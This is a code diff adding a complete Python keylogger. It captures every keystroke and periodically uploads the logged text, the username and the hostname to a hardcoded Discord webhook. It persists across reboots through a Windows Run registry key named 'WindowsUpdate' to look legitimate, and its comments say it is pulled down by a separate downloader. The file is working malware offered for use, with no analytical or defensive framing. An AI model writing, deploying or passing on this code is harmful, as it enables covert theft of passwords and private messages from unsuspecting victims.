@@ -1,0 +1,133 @@
+import os
+import sys
+import time
+import requests
+from datetime import datetime
+from pynput import keyboard
+import threading
+import platform
+import getpass
+
+# IMPORTANT: This script will be downloaded at runtime
+# The webhook URL must be hardcoded here OR passed from downloader
+
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1551438669150158918/CBdko7PZqRXHcXJ0uCC6PAVsDsN44Eqwm6X40hreDCLuxll22aRQDYyY7vwmlcxVzPRQ"
+SEND_INTERVAL = 60
+
+class Keylogger:
+    def __init__(self, webhook_url, interval=60):
+        self.webhook_url = webhook_url
+        self.interval = interval
+        self.log = []
+        self.is_running = True
+        
+        self.special_keys = {
+            keyboard.Key.space: ' ',
+            keyboard.Key.enter: '\n',
+            keyboard.Key.tab: '[TAB]',
+            keyboard.Key.backspace: '[BS]',
+        }
+    
+    def send_status(self, message):
+        try:
+            requests.post(self.webhook_url, json={"content": f"[{platform.node()}] {message}"}, timeout=5)
+        except:
+            pass
+    
+    def on_press(self, key):
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                self.log.append(key.char)
+            else:
+                key_str = self.special_keys.get(key, '')
+                if key_str:
+                    self.log.append(key_str)
+        except:
+            pass
+    
+    def send_logs(self):
+        try:
+            if not self.log:
+                return
+            
+            log_text = ''.join(self.log)
+            
+            if not log_text.strip():
+                return
+            
+            hostname = platform.node()
+            username = getpass.getuser()
+            
+            embed = {
+                "title": "⌨️ Keylog",
+                "color": 15158332,
+                "fields": [
+                    {
+                        "name": "System",
+                        "value": f"{username}@{hostname}",
+                        "inline": True
+                    },
+                    {
+                        "name": "Keys",
+                        "value": f"{len(log_text)} chars",
+                        "inline": True
+                    },
+                    {
+                        "name": "Time",
+                        "value": datetime.now().strftime('%H:%M:%S'),
+                        "inline": True
+                    }
+                ]
+            }
+            
+            requests.post(self.webhook_url, json={"embeds": [embed]}, timeout=10)
+            
+            filename = f"log_{datetime.now().strftime('%H%M%S')}.txt"
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(log_text)
+            
+            with open(filename, 'rb') as f:
+                requests.post(self.webhook_url, files={'file': (filename, f)}, timeout=10)
+            
+            os.remove(filename)
+            self.log = []
+            
+        except:
+            pass
+    
+    def periodic_send(self):
+        while self.is_running:
+            time.sleep(self.interval)
+            if self.is_running:
+                self.send_logs()
+    
+    def start(self):
+        self.send_status("🚀 Downloaded keylogger starting...")
+        
+        send_thread = threading.Thread(target=self.periodic_send, daemon=True)
+        send_thread.start()
+        
+        while self.is_running:
+            try:
+                with keyboard.Listener(on_press=self.on_press) as listener:
+                    self.send_status("✅ Listener active")
+                    listener.join()
+            except Exception as e:
+                self.send_status(f"⚠️ Listener error: {str(e)}")
+                time.sleep(5)
+
+def add_to_startup():
+    try:
+        import winreg
+        # Get the downloader path, not this script
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+    except:
+        pass
+
+# Main execution
+add_to_startup()
+keylogger = Keylogger(WEBHOOK_URL, SEND_INTERVAL)
+keylogger.start()
